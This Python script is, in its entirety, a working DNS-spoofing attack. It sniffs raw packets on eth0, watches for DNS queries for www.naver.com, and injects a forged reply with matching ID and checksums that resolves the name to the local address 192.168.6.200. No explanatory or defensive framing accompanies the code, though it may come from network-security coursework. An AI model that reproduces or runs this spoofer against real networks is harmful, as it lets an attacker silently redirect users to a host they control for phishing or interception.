import socket
import struct
import time
from header.packet import *
from header.eth import *
from header.ip import *
from header.udp import *

def make_chksum( header ):

  size = len( header )
  if size % 2:
    header = header + b'\x00'
    size = len( header )

  size = size // 2
  header = struct.unpack('!' + str(size) + 'H', header )
  chksum = sum( header )

  carry = chksum & 0xFF0000
  carry = carry >> 16
  while carry != 0:
    chksum = chksum & 0xFFFF
    chksum = chksum + carry
    carry = chksum & 0xFF0000
    carry = carry >> 16

  chksum = chksum ^ 0xFFFF
  return chksum

raw = socket.socket( socket.PF_PACKET, socket.SOCK_RAW )
raw.bind( ('eth0', socket.SOCK_RAW) )

packet = ''
while True:
  data, addr = raw.recvfrom( 65535 )
  packet = Packet( data )

  if packet.eth.type == 0x0800 and packet.ip.type == 17 and packet.udp.dst == 53:
    name = packet.udp._data[12:]
    name = name.split(b'\x00')
    name = name[0]

    domain = ''
    for x in name:
      if 48 <= x <= 57: domain += chr(x)
      elif 65 <= x <= 90: domain += chr(x) 
      elif 97 <= x <= 122: domain += chr(x)
      else: domain += '.'
    domain = domain[1:]
    print( domain )
    
    if domain == "www.naver.com":

      eth = Eth()
      ip = Ip()
      udp = Udp()

      dns = packet.udp._data[:2]
      dns += b'\x80\x00'
      dns += b'\x00\x01'
      dns += b'\x00\x01'
      dns += b'\x00\x00'
      dns += b'\x00\x00'
      dns += b'\x03www\x05naver\x03com\x00'
      dns += b'\x00\x01'
      dns += b'\x00\x01'
      dns += b'\x03www\x05naver\x03com\x00'
      dns += b'\x00\x01'
      dns += b'\x00\x01'
      dns += b'\x12\x34\x56\x78'
      dns += b'\x00\x04'
      dns += b'\xc0\xa8\x06\xc8'

      udp.dst = packet.udp.src
      udp.src = packet.udp.dst
      udp.length = 0
      udp.chksum = 0
      udp._data = dns
      udp.length = len( udp.header )

      ip.dst = packet.ip.src
      ip.src = packet.ip.dst
      ip.service = 0
      ip.total = 0
      ip.id = 1234
      ip.flag = 0
      ip.offset = 0
      ip.ttl = 64
      ip.type = 17
      ip.ver = 4
      ip.length = 20
      ip.chksum = 0
      ip.total = len(ip.header) + len(udp.header)
      ip.chksum = make_chksum( ip.header )

      pseudo = ip._src + ip._dst + b'\x00' + ip._type + udp._length + udp.header 
      udp.chksum = make_chksum( pseudo )

      eth.dst = packet.eth.src
      eth.src = packet.eth.dst
      eth.type = packet.eth.type

      raw.send( eth.header + ip.header + udp.header )




















